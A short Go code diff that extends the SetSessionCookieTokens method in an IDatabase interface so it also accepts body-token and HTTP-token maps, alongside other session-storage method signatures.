@@ -21,6 +21,6 @@ type IDatabase interface {
 	SetSessionCustom(sid string, name string, value string) error
 	SetSessionBodyTokens(sid string, tokens map[string]string) error
 	SetSessionHttpTokens(sid string, tokens map[string]string) error
-	SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error
+	SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error
 	SetSessionCountryInfo(sid string, countryCode string, country string) error
 } 
